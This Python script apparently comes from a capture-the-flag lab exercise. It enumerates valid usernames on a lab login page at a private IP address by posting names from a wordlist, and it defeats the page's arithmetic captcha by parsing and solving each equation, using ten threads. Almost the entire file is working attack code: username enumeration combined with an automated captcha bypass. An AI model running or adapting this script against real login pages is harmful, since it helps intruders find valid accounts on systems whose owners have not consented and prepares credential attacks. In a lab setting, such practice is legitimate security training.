import requests
import re
from bs4 import BeautifulSoup
import concurrent.futures


# URL of the webpage
url = "http://10.10.104.92/login"
file_path = "/home/kali/uebungen/thm/Prioritisev2/usernames.txt"


def getCaptchaSolution(response):
	soup = BeautifulSoup(response.content, 'html.parser')

	# Find all text that matches the pattern of an equation
	equation_pattern = re.compile(r'\s*\d+\s*[-+*/]\s*\d+\s*=\s*\?')
	equation_matches = soup.find_all(string=equation_pattern)

	# Extract and process each equation match
	for equation_text in equation_matches:
		# Extract the numbers and operator from the equation text using regex
		equation_match = re.search(r'(\d+)\s*([-+*/])\s*(\d+)\s*=', equation_text)
		if equation_match:
			num1 = int(equation_match.group(1))
			operator = equation_match.group(2)
			num2 = int(equation_match.group(3))

			# Calculate the result
			if operator == '+':
			    result = num1 + num2
			elif operator == '-':
			    result = num1 - num2
			elif operator == '*':
			    result = num1 * num2
			elif operator == '/':
			    result = num1 / num2

			print(f"Equation: {equation_text.strip()} = {result}")
			#Set new Captcha value
			return str(result)

def check_user(username, captcha):
	post_data = {"username": username, "password": "test", "captcha": captcha}
	response = requests.post(url, data=post_data)

	if "does not exist" not in response.text:
		print(f"User found: {username}")
		return True
	return getCaptchaSolution(response)


def main():
	post_data = {"username": "admin", "password": "admin"}
	response = requests.post(url, data=post_data)
	captcha = getCaptchaSolution(response)
	print(f"First captcha: {captcha}")

	with open(file_path, 'r') as file:
		lines = file.readlines()

	# Begrenzte Anzahl von Threads im Pool
	max_threads = 10
	with concurrent.futures.ThreadPoolExecutor(max_threads) as executor:
		futures = []
		for line in lines:
			username = line.strip()
			future = executor.submit(check_user, username, captcha)
			futures.append(future)

		# Ergebnisse abrufen (True f√ºr gefundene Benutzer, False sonst)
		for future in concurrent.futures.as_completed(futures):
			if future.result():
				break

if __name__ == "__main__":
    main()
